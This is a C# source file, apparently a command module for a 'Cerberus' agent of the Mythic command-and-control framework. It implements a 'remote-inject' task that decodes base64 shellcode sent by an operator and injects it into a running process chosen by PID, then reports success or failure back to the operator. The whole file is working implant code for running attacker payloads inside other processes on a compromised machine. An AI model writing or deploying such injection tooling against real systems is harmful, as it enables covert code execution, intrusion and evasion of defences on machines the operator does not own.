using Extend;
using Models.Tasks;
using System;
using System.Text;

namespace Injection
{
    public class RemoteInject : CerberusCommand
    {
        public override string Name => "remote-inject";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<RemoteInjectParam>();

            var FileBytes = Convert.FromBase64String(Arguments.file);

            if (!int.TryParse(Arguments.pid, out var pid))
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to parse PID",
                    completed = true,
                    status = "Error",
                    error = "Failed to parse PID"
                };

                return result;
            }
                

            var injector = new RemoteInjector();
            var success = injector.Inject(FileBytes, pid);

            if (success)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Shellcode injected",
                    completed = true,
                    status = "success",
                };
            }
            else
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to inject shellcode",
                    completed = true,
                    status = "Error",
                    error = "Failed to inject shellcode"
                };
            }

            return result;
        }

        public class RemoteInjectParam
        {
            public string pid { get; set; }
            public string file { get; set; }
        }
    }
}
